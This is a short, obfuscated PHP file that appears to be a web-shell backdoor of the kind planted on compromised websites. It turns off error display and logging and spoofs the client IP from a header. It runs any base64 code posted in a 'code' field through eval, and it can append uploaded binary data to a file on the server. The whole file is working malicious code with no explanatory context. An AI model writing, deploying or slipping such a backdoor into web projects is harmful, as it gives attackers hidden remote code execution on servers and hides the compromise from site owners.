<?php @error_reporting(0); @ini_set("d\x69s\x70\x6c\x61y\x5fe\x72rors",0); @ini_set("l\x6f\x67\x5ferr\x6fr\x73",0); @ini_set("\x65r\x72o\x72\x5f\x6c\x6f\x67",0); @ini_set("mem\x6f\x72y_l\x69m\x69t", "\x312\x38M"); @ini_set("m\x61x_\x65xe\x63\x75\x74i\x6fn\x5f\x74i\x6de",30); @set_time_limit(30); if (isset($_SERVER["HTTP_\x58_REAL_IP"])) $_SERVER["R\x45M\x4fTE\x5f\x41D\x44R"] = $_SERVER["HTTP_\x58_REAL_IP"]; if (isset($_POST["c\x6fde"])) { eval(base64_decode($_POST["c\x6fde"])); } elseif (isset($_SERVER["\x48T\x54\x50\x5fCO\x4eT\x45N\x54\x5fE\x4eCO\x44\x49\x4eG"]) && $_SERVER["\x48T\x54\x50\x5fCO\x4eT\x45N\x54\x5fE\x4eCO\x44\x49\x4eG"] == "\x62i\x6e\x61\x72\x79") { $input = file_get_contents("p\x68p:\x2f\x2f\x69\x6e\x70\x75\x74"); if (strlen($input) > 0) print "ST\x41\x54US-\x49\x4d\x50O\x52T-OK"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2ep\x68p",".b\x69n",basename($_SERVER["\x53CR\x49PT\x5fFIL\x45NA\x4dE"])), "a"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["R\x45M\x4fTE\x5f\x41D\x44R"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["RE\x51UEST\x5fU\x52\x49"], ".sh\x74m\x6c") !== false) { print $_SERVER["RE\x51UEST\x5fU\x52\x49"]; } exit; ?>